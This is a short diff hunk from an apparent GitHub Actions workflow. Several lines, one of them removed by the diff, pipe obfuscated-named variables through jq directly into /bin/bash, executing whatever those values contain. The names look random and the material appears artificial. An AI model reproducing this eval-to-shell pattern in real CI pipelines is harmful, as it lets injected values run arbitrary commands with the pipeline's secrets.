@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$nw86" | jq -r .knnq8 | /bin/bash
           printf '%s' "$qcz3492" | jq -r .trot777 | /bin/bash
           echo $lfms72 | jq -r .cwde32230 | /bin/bash
-          printf '%s' "$hbh8674" | jq -r .s4 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
